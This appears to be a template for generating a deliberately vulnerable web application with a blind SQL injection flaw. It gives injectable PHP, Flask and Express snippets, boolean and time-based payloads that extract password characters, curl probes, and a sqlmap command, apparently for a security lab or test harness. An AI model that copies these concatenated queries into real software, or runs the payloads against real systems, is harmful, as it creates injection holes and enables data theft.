---
id: sqli_blind
type: web_vulnerability
description: A blind SQL injection vulnerability where query results are not reflected in the response, but the application's behaviour (content shown/hidden, or response time) leaks information about the underlying data.
required_vars: []
---
# Atom: Blind SQL Injection

The application is vulnerable to SQL injection but does not reflect query results directly in the response. Instead, the attacker infers data by observing whether a condition is true or false (boolean-based) or by inducing deliberate delays (time-based). Typically exploited with sqlmap rather than manual payloads.

### Logic Requirements:
1. A query is built via string concatenation using unsanitized user input.
2. The query result is NOT reflected in the response — the app shows a binary outcome (e.g. "found"/"not found", or record shown vs. blank page).
3. For boolean-based: the app's response differs meaningfully when the injected condition is true vs. false.
4. For time-based: the app does not sanitize SLEEP() / pg_sleep() / randomblob() calls.
5. No parameterized queries or prepared statements are used.

### Synthesis Guidance:
The injection point is a lookup or existence check — a user profile page, a product lookup, or a subscription check. The app shows a page if the record exists and a blank/error page if it does not. This binary difference is enough to extract data bit by bit.

**PHP (Apache + MySQLi — boolean-based):**
```php
$query = "SELECT id FROM users WHERE username='" . $_GET['user'] . "'";
$result = mysqli_query($conn, $query);
if (mysqli_num_rows($result) > 0) {
    echo "User exists.";
} else {
    echo "User not found.";
}
```
Boolean payload: `admin' AND SUBSTRING(password,1,1)='a'-- -`
Time-based payload: `admin' AND SLEEP(3)-- -`

**Python / Flask (sqlite3 — boolean-based):**
```python
query = f"SELECT id FROM users WHERE username='{username}'"
row = conn.execute(query).fetchone()
return "Found" if row else "Not found"
```
Boolean payload: `admin' AND SUBSTR(password,1,1)='a'-- -`
Time-based (sqlite3 uses randomblob for delay): `admin' AND randomblob(100000000)-- -`

**Node.js / Express (mysql2 — boolean-based):**
```js
const query = `SELECT id FROM users WHERE username='${req.query.user}'`;
conn.query(query, (err, rows) => {
    res.send(rows.length ? "Found" : "Not found");
});
```
Boolean payload: `admin' AND SUBSTRING(password,1,1)='a'-- -`
Time-based payload: `admin' AND SLEEP(3)-- -`

### Testing Guidance:
**Layer 1 — Internal state check:**
Confirm different responses for true vs. false conditions:
```bash
# True condition — should return "found/exists" response
curl -s "http://localhost/app?user=admin'+AND+'1'='1'--+-"
# False condition — should return "not found/empty" response
curl -s "http://localhost/app?user=admin'+AND+'1'='2'--+-"
```
The two responses must differ. For time-based, confirm a SLEEP payload causes a measurable delay:
```bash
time curl -s "http://localhost/app?user=admin'+AND+SLEEP(2)--+-"
```

**Layer 2 — External attack probe (from attacker container):**
```bash
# Boolean: true vs false conditions produce different responses
curl -s "http://target/app?user=admin'+AND+'1'='1'--+-"
curl -s "http://target/app?user=admin'+AND+'1'='2'--+-"
# For automated extraction: sqlmap -u "http://target/app?user=admin" --dbs
```
